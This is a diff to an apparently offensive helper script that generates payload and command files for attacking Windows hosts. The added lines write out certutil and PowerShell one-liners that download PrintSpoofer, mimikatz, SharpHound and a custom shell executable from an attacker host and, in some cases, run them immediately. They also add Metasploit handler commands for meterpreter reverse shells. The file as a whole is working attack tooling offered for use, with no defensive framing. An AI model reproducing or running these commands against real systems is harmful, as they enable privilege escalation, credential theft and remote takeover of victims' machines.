@@ -109,6 +109,7 @@ msfvenom --platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=$
 
 echo "Building the prefered shells :)"
 echo '#POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
+echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 powershell.py ${IP} ${PORT} ${BESTAND}_${PORT}.txt
 
 
@@ -116,18 +117,31 @@ python3 powershell.py ${IP} ${PORT} ${BESTAND}_${PORT}.txt
 echo '#Downloads' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe' >> http/payloads/${BESTAND}_${PORT}.txt
 echo 'certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+
+
+
 echo 'certutil -urlcache -split -f http://${IP}/tools/SharpHound.exe sharphound.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+
+echo 'certutil -urlcache -split -f http://${IP}/payloads/shell_meth.exe meth.exe' >> http/payloads/${BESTAND}_${PORT}.txt
+
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 
-
-echo "cd C:\Windows\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
-echo "cd C:\Windows\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
-echo "cd C:\Windows\\tasks && certutil -urlcache -f http://${IP}/SharpHound.exe sharphound.exe" > http/commands/sharphound
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe')" > http/commands/psprintspooler
+echo "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST ${localnic};set LPORT ${PORT};run -j;" > http/commands/msf_https
+echo "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST ${localnic};set LPORT ${PORT};run -j;" > http/commands/msf_tcp
+echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
+echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
+echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/SharpHound.exe sharphound.exe" > http/commands/sharphound
+echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/payloads/shell_meth.exe meth.exe" > http/commands/certutilmeth
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe')" > http/commands/psprintspoofer
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe') && c:\windows\\\tasks\print.exe -i -c cmd" > http/commands/printerspoofer
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\\tasks\mimi.exe')" > http/commands/psmimikatz
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe')" > http/commands/pssharphound
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe')" > http/commands/psmeth
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethrun
+
 
 
 
